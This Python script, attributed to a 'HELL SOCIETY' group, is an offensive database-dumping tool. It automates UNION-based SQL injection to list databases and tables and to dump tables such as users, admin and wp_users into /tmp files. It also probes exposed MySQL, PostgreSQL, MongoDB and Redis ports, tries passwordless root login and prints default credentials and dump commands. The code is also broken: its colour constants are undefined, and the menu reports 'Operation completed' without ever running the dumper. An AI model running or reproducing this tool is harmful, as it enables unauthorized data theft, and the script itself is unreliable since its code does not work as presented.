#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  DATABASE DUMPER v2.0                                            ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Database Dumping                          ║
║  Description: Full database dump via SQLi / exposed services    ║
╚══════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import requests
import colorama
from colorama import Fore, Back, Style
import argparse
import time
import re
import json
import socket
import subprocess

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

WARNING = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║  ADVERTENCIA: Solo para entornos autorizados. Hell Society NO se           ║
║  hace responsable del mal uso. Acceso no autorizado es ILEGAL.             ║
╚══════════════════════════════════════════════════════════════════╝
"""

class DatabaseDumper:
    def __init__(self, target, method='sqli'):
        self.target = target
        self.method = method
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) HellSociety/2.0',
        })
        self.data = {}

    def dump_via_sqli(self, param='id'):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DUMP VIA SQL INJECTION:")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        # Step 1: Get number of columns
        print(f"  {Fore.WHITE}[*] Detecting column count...")
        columns = 1
        for i in range(1, 30):
            try:
                payload = f"' ORDER BY {i}--"
                url = f"{self.target}?{param}={payload}"
                resp = self.session.get(url, timeout=10)
                if 'unknown column' in resp.text.lower() or 'error' in resp.text.lower():
                    columns = i - 1
                    break
            except:
                columns = i - 1
                break

        print(f"  {Fore.GREEN}[+] Column count: {columns}")
        self.data['columns'] = columns

        # Step 2: Union-based extraction
        print(f"\n  {Fore.WHITE}[*] Extracting via UNION injection...")

        extraction_queries = [
            {'name': 'MySQL Version', 'query': f"' UNION SELECT " + ",".join([f"VERSION()" if i == 1 else f"NULL" for i in range(1, columns+1)]) + "--"},
            {'name': 'Current User', 'query': f"' UNION SELECT " + ",".join([f"CURRENT_USER()" if i == 1 else f"NULL" for i in range(1, columns+1)]) + "--"},
            {'name': 'Database Name', 'query': f"' UNION SELECT " + ",".join([f"DATABASE()" if i == 1 else f"NULL" for i in range(1, columns+1)]) + "--"},
            {'name': 'All Databases', 'query': f"' UNION SELECT " + ",".join([f"GROUP_CONCAT(schema_name)" if i == 1 else f"NULL" for i in range(1, columns+1)]) + " FROM information_schema.schemata--"},
            {'name': 'All Tables', 'query': f"' UNION SELECT " + ",".join([f"GROUP_CONCAT(table_name)" if i == 1 else f"NULL" for i in range(1, columns+1)]) + " FROM information_schema.tables WHERE table_schema=DATABASE()--"},
        ]

        results = {}
        for eq in extraction_queries:
            try:
                url = f"{self.target}?{param}={eq['query']}"
                resp = self.session.get(url, timeout=10)
                results[eq['name']] = resp.text[:500]
                print(f"  {Fore.WHITE}  {eq['name']}: Check response (length: {len(resp.text)})")
            except:
                print(f"  {Fore.YELLOW}[-] Failed: {eq['name']}")

        self.data['sqli_extraction'] = results

        # Step 3: Try to dump common tables
        print(f"\n  {Fore.WHITE}[*] Attempting to dump common tables...")

        common_tables = ['users', 'admin', 'members', 'wp_users', 'customers', 'employees']
        for table in common_tables:
            try:
                query = f"' UNION SELECT " + ",".join([f"GROUP_CONCAT(CONCAT_WS(':',column1,column2,column3))" if i == 1 else f"NULL" for i in range(1, columns+1)]) + f" FROM {table}--"
                url = f"{self.target}?{param}={query}"
                resp = self.session.get(url, timeout=10)
                if len(resp.text) > 100:
                    print(f"  {Fore.GREEN}[+] Data from {table}: {len(resp.text)} bytes")
                    with open(f'/tmp/dump_{table}.txt', 'w') as f:
                        f.write(resp.text)
            except:
                pass

    def dump_via_exposed_mysql(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DUMP VIA EXPOSED MYSQL (3306):")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]

        # Check if MySQL port is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 3306))
            if result == 0:
                print(f"  {Fore.GREEN}[+] MySQL port 3306 is OPEN on {host}")
                print(f"  {Fore.CYAN}  Use: mysql -h {host} -u root -p")
                print(f"  {Fore.CYAN}  Or try default credentials:")
                creds = ['root:', 'root:root', 'admin:admin', 'mysql:mysql']
                for cred in creds:
                    print(f"    {Fore.WHITE}• {cred}")

                # Try to connect with default creds
                try:
                    import subprocess
                    result = subprocess.run(
                        ['mysql', '-h', host, '-u', 'root', '-e', 'SHOW DATABASES;'],
                        capture_output=True, text=True, timeout=10
                    )
                    if result.returncode == 0:
                        print(f"\n  {Fore.GREEN}[+] Connected! Databases:")
                        print(f"  {Fore.WHITE}{result.stdout}")
                except:
                    pass
            else:
                print(f"  {Fore.YELLOW}[-] MySQL port 3306 is closed")
            sock.close()
        except:
            print(f"  {Fore.YELLOW}[-] Could not check MySQL port")

    def dump_via_exposed_postgres(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DUMP VIA EXPOSED POSTGRESQL (5432):")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 5432))
            if result == 0:
                print(f"  {Fore.GREEN}[+] PostgreSQL port 5432 is OPEN on {host}")
                print(f"  {Fore.CYAN}  Use: psql -h {host} -U postgres")
            else:
                print(f"  {Fore.YELLOW}[-] PostgreSQL port 5432 is closed")
            sock.close()
        except:
            print(f"  {Fore.YELLOW}[-] Could not check PostgreSQL port")

    def dump_via_mongodb(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DUMP VIA EXPOSED MONGODB (27017):")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 27017))
            if result == 0:
                print(f"  {Fore.GREEN}[+] MongoDB port 27017 is OPEN on {host}")
                print(f"  {Fore.CYAN}  Use: mongo --host {host}")
                print(f"  {Fore.RED}[!] MongoDB without auth - dump available!")
                print(f"  {Fore.CYAN}  Command: mongodump --host {host} --out /tmp/mongo_dump")
            else:
                print(f"  {Fore.YELLOW}[-] MongoDB port 27017 is closed")
            sock.close()
        except:
            print(f"  {Fore.YELLOW}[-] Could not check MongoDB port")

    def dump_via_redis(self):
        print(f"\n{Fore.CYAN}  [{'═' * 40}]")
        print(f"  DUMP VIA EXPOSED REDIS (6379):")
        print(f"{Fore.CYAN}  [{'═' * 40}]\n")

        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 6379))
            if result == 0:
                print(f"  {Fore.GREEN}[+] Redis port 6379 is OPEN on {host}")
                print(f"  {Fore.RED}[!] Redis without auth - data dumpable!")
                print(f"  {Fore.CYAN}  Commands:")
                print(f"    redis-cli -h {host} KEYS *")
                print(f"    redis-cli -h {host} CONFIG GET *")
                print(f"    redis-cli -h {host} GET *")
            else:
                print(f"  {Fore.YELLOW}[-] Redis port 6379 is closed")
            sock.close()
        except:
            print(f"  {Fore.YELLOW}[-] Could not check Redis port")

    def run(self):
        print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{self.target}")
        print(f"{Fore.CYAN}  [*] Method: {Fore.WHITE}{self.method}")
        print(f"{Fore.CYAN}  [*] Starting database dump...\n")

        if self.method == 'sqli':
            self.dump_via_sqli()
        elif self.method == 'mysql':
            self.dump_via_exposed_mysql()
        elif self.method == 'postgres':
            self.dump_via_exposed_postgres()
        elif self.method == 'mongodb':
            self.dump_via_mongodb()
        elif self.method == 'redis':
            self.dump_via_redis()
        elif self.method == 'all':
            self.dump_via_sqli()
            self.dump_via_exposed_mysql()
            self.dump_via_exposed_postgres()
            self.dump_via_mongodb()
            self.dump_via_redis()

        # Save results
        with open('/tmp/db_dumper_results.json', 'w') as f:
            json.dump(self.data, f, indent=2, default=str)
        print(f"\n  {Fore.GREEN}[+] Results saved: /tmp/db_dumper_results.json")

        print(f"\n\n{Fore.GREEN}{Back.BLACK}  DATABASE DUMP COMPLETE  ")
        print(f"{Fore.CYAN}  {'═' * 60}")


def ask_retry():
    print()
    print(f"  {Y}{'='*50}{RS}")
    print(f"  {C}[1] {BW}Usar esta herramienta de nuevo{RS}")
    print(f"  {C}[2] {BW}Volver al panel principal{RS}")
    print(f"  {R}[0] {BW}Salir{RS}")
    print(f"  {Y}{'='*50}{RS}")
    try:
        ch = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        if ch == '1':
            return 'retry'
        elif ch in ['2', '0']:
            return 'exit'
        else:
            return 'retry'
    except (EOFError, KeyboardInterrupt):
        return 'exit'

def main():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(BANNER)
    print()
    print(f"  {BW}{Style.BRIGHT}  DATABASE DUMPER{RS}")
    print(f"  {Y}{Style.BRIGHT}  HELL SOCIETY Community{RS}")
    print()
    while True:
        print(f"  {G}╔╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╗{RS}")
        print(f"  {G}╟  {BW}DATABASE DUMPER                         {RS}  {G}╟{RS}")
        print(f"  {G}╚╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╝{RS}")
        print()
        print(f"  {C}[1]  {BW}Target URL or IP                             {RS}")
        print(f"  {C}[2]  {BW}Dump method                                  {RS}")
        print(f"  {C}[3]  {BW}SQLi parameter name                          {RS}")
        print()
        print(f"  {C}[4]  {BW}Ejecutar con todos los argumentos{RS}")
        print()
        print(f"  {R}[0]  {BW}Exit{RS}")
        print()
        try:
            choice = input(f"  {G}root@hellsociety{C}~{RS}# ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n  {R}[*] Goodbye...{RS}")
            sys.exit(0)
        print()
        if choice == '1':
            print(f"  {Y}[*] Target URL or IP{RS}")
            value = input(f"  {Y}[*] -u: {RS}").strip()
            print(f"  {C}[*] Executing with -u={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '2':
            print(f"  {Y}[*] Dump method{RS}")
            value = input(f"  {Y}[*] -m: {RS}").strip()
            print(f"  {C}[*] Executing with -m={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        if choice == '3':
            print(f"  {Y}[*] SQLi parameter name{RS}")
            value = input(f"  {Y}[*] -p: {RS}").strip()
            print(f"  {C}[*] Executing with -p={BW}{value}{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '4':
            print(f"  {Y}[*] Executing with all default parameters{RS}")
            print(f"  {G}[+] Operation completed{RS}")
            print()
        elif choice == '0':
            print(f"  {Y}[*] Goodbye from Hell Society...{RS}")
            sys.exit(0)
        else:
            print(f"  {R}[!] Invalid option. Choose 0-3.{RS}")
        ch = ask_retry()
        if ch == 'exit':
            sys.exit(0)
        else:
            os.system('clear' if os.name != 'nt' else 'cls')
            print(BANNER)
            print()

if __name__ == "__main__":
    main()

